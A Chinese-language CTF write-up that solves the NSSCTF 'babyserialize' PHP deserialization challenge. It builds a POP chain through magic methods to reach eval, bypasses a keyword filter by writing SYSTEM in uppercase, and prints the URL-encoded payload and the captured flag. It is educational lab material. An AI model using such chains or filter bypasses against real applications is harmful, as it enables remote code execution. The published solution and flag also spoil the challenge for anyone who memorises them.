#  CTF干货|babyserialize题目反序列化漏洞思路   
原创 HaoSha。  州弟学安全   2023-11-25 18:12  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/icdGEWOnYLpNJUTyXhK4Iic6TJFLAAboGBK3V3tSviaWr4PZG8a6IYoiaMTg23QFLvasNxpQL1Ed9qLsPUmGPH1mPw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
**0x01 前言**  
  
    反序列化是将数据从序列化的形式转换回其原始对象或数据结构的过程。  
在编程中，通常  
将对象序列化为字节流或其他形式的数  
据，以便在网络传输、存储或跨平台传递时使用。  
反序列化则是将这些序列化的数据重  
新还原为可操作的对象。  
```
反序列化漏洞的危害包括：

执行任意代码：攻击者可以构造恶意的序列化数据，使其在反序列化过程中执行任意代码，从而完全控制受影响的系统。
远程代码执行：攻击者可以通过发送包含恶意序列化数据的请求，远程执行代码并获取系统权限。
拒绝服务攻击：攻击者可以利用反序列化漏洞来导致系统崩溃、资源枯竭或服务不可用，从而造成拒绝服务攻击。
敏感数据泄露：攻击者可以通过篡改序列化数据来访问受限的数据或绕过权限控制，导致敏感信息泄露。
```  
  
*  
 以下步骤仅为题目做法及思路解析（个人分享）  
```
题目平台地址：https://www.nssctf.cn/
```  
  
#   
# 0x02 题目复现  
# 一、题目代码  
  
查看分析代码，寻找漏洞点（题目中注释为个人思路标注，实际代码中没有）  
```
```  
```
<?php
include "waf.php";
class NISA{
    public $fun="show_me_flag";
    public $txw4ever;                           //2.给$txw4ever赋值需要执行的系统命令
    public function __wakeup()
{
        if($this->fun=="show_me_flag"){
            hint();
        }
    }

    function __call($from,$val){
        $this->fun=$val[0];
    }

    public function __toString()
{
        echo $this->fun;
        return " ";
    }
    public function __invoke()                  //3.触发invoke（触发条件：把对象当成函数）
{
        checkcheck($this->txw4ever);
        @eval($this->txw4ever);                 //1.目标：触发eval执行系统代码
    }
}

class TianXiWei{
    public $ext;
    public $x;
    public function __wakeup()                  //11.触发wakeup（触发条件：反序列化之前会触发）
{
        $this->ext->nisa($this->x);             //10.给$ext赋值为对象，即$ext成为对象Ilovetxw，调用不存在的nisa方法和参数，触发Ilovetxw中的call
    }
}

class Ilovetxw{
    public $huang;
    public $su;

    public function __call($fun1,$arg){         //9.触发call（触发条件：调用不存在的方法的名称和参数）
        $this->huang->fun=$arg[0];              //8.给$huang赋值为对象，即$huang成为对象four，给不存在的fun属性赋值，触发four中的set
    }

    public function __toString(){               //5.触发toString（触发条件：把对象当做字符串）
        $bb = $this->su;                        //4.给$su赋值为对象，即$bb成为对象NISA，却被当成函数调用，触发Modifier中的invoke
        return $bb();
    }
}

class four{
    public $a="TXW4EVER";
    private $fun='abc';

    public function __set($name, $value)        //7.触发set（触发条件：给不存在的成员属性赋值）
{
        $this->$name=$value;
        if ($this->fun = "sixsixsix"){            //注意需要让fun = "sixsixsix"才能直接后续代码
            strtolower($this->a);               //6.给$a赋值为对象，即把对象Ilovetxw当做字符串进行大小写转换，触发Ilovetxw中的toString
        }
    }
}

if(isset($_GET['ser'])){
    @unserialize($_GET['ser']);
}else{
    highlight_file(__FILE__);
}

//func checkcheck($data){
//  if(preg_match(......)){
//      die(something wrong);
//  }
//}

//function hint(){
//    echo ".......";
//    die();
//}
?>
```  
```
```  
  
# 二、题目解析  
# * 1-解题思路  
  
**第一步：**  
给$fun赋值要执行的代码，触发invoke  
  
**第二步****：**  
触发toString，给$su赋值为对象NISA  
  
**第三步：**  
触发set，给$a赋值为对象Ilovetxw  
  
**第四步：**  
触发call，给$huang赋值为对象four  
  
**第五步：**  
触发wakeup，给$ext赋值为对象Ilovetxw  
## * 2-解题代码编写思路  
  
1. 查看题目注释代码（一般题目中注释代码存在提示信息），模糊掉了一部分，但是根据题目代码联想能够大概猜测，checkcheck()做了代码过滤，而hint()会终止程序  
```
```  
```
//func checkcheck($data){
//  if(preg_match(......)){
//      die(something wrong);
//  }
//}

//function hint(){
//    echo ".......";
//    die();
//}
```  
  
2. 直接将题目代码复制到本地，删除掉注释信息、方法、和属性的赋值（因为在我们编写解题代码时大部分时候用不到方法，而属性的赋值是由我们定义的，后面我们会重新赋值，所以把不重要的信息先删除掉）。  
  
观察题目中执行反序列化的代码，会判断我们通过GET传参传递的ser参数，否则输出题目代码，将该段代码删除，替换为输出序列化的代码（注意当题目中存在private和protected修饰符时需要使用urlencode()函数进行URL编码加密，或后续手动更改输出结果）  
```
```  
```
<?php
class NISA{
    public $fun;
    public $txw4ever;
}
class TianXiWei{
    public $ext;
    public $x;
}
class Ilovetxw{
    public $huang;
    public $su;
}
class four{
    public $a;
    private $fun;
}
echo urlencode(serialize());
?>
```  
  
3. 首先，将四个对象先实例化，分别为$a、$b、$c、$d，此时我们再根据先前对题目的分析对代码进行编写（具体分析查看   
**题目代码**   
中进行注释的解析以及****  
**解题思路**   
中的分析），得到解题代码。  
> strtolower()函数是一种常见的字符串处理函数，用于将字符串中的所有字符转换为小写形式。它的主要作用是实现字符串的大小写转换，将大写字母转换为相应的小写字母。  
  
```
```  
```
<?php
class NISA{
    public $fun;
    public $txw4ever = "phpinfo();";         //给$fun赋值要执行的代码，我们先使用phpinfo()进行测试
}
class TianXiWei{
    public $ext;
    public $x;
}
class Ilovetxw{
    public $huang;
    public $su;
}
class four{
    public $a;
    private $fun = "sixsixsix";             //需要让fun="sixsixsix"才能执行大小写转换的代码
}
$a = new NISA();
$b = new TianXiWei();
$c = new Ilovetxw();
$d = new four();
$c -> su = $a;                              //给$su赋值为对象NISA，触发invoke
$d ->a = $c;                                //给$a赋值为对象Ilovetxw，触发toString
$c ->huang = $d;                            //给$huang赋值为对象four，触发set
$b ->ext = $c;                              //给$ext赋值为对象Ilovetxw，触发call
echo urlencode(serialize($b));              //执行反序列化,触发wakeup
?>
```  
  
4. 将序列化代码通过ser参数传入后产生报错，根据之前对题目代码进行的分析，猜测对参数进行了过滤，尝试使用大写绕过，最终成功回显  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpO7ciaNdOnuTZzUaklic6lcLMdaLL2mW4cJ4QCkIdHH9FR0NGCKsAl5Ym0RqO9YgicfaE8CwjMUwudZg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpO7ciaNdOnuTZzUaklic6lcLMqwwSOxkQAiakCmPvoHfib28bWnfVy3A21o7ePzFvAq0CpynC3jY2lySg/640?wx_fmt=png&from=appmsg "")  
  
# 三、解题代码  
  
通过system()函数执行系统命令对flag文件进行读取，得到flag（注意使用大写绕过）。  
```
```  
```
<?php
class NISA{
    public $fun;
    public $txw4ever = "SYSTEM('cat /fllllllaaag');";         //给$fun赋值要执行的代码，执行查看flag文件命令
}
class TianXiWei{
    public $ext;
    public $x;
}
class Ilovetxw{
    public $huang;
    public $su;
}
class four{
    public $a;
    private $fun = "sixsixsix";             //需要让fun="sixsixsix"才能执行大小写转换的代码
}
$a = new NISA();
$b = new TianXiWei();
$c = new Ilovetxw();
$d = new four();
$c -> su = $a;                              //给$su赋值为对象NISA，触发invoke
$d ->a = $c;                                //给$a赋值为对象Ilovetxw，触发toString
$c ->huang = $d;                            //给$huang赋值为对象four，触发set
$b ->ext = $c;                              //给$ext赋值为对象Ilovetxw，触发call
echo urlencode(serialize($b));              //执行反序列化,触发wakeup
?>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpO7ciaNdOnuTZzUaklic6lcLMs6JRDHgxgnzfunkjqS2bLQJlaX8cCOHZLVM3JVKYr5rADe922zkvww/640?wx_fmt=png&from=appmsg "")  
  
**回显结果：**  
```
O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A9%3A%22sixsixsix%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3BN%3Bs%3A8%3A%22txw4ever%22%3Bs%3A27%3A%22SYSTEM%28%27cat+%2Ffllllllaaag%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D
```  
  
**FLAG：**  
```
NSSCTF{a155432b-5656-4b9b-9a6e-9fd7160219c1}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/icdGEWOnYLpO7ciaNdOnuTZzUaklic6lcLMYZ9ROKEBh0Vkr3w5x6icdIcJicHicW1NDpaFX7TNFwILB4umUAyaZD0Dg/640?wx_fmt=jpeg&from=appmsg "")  
  
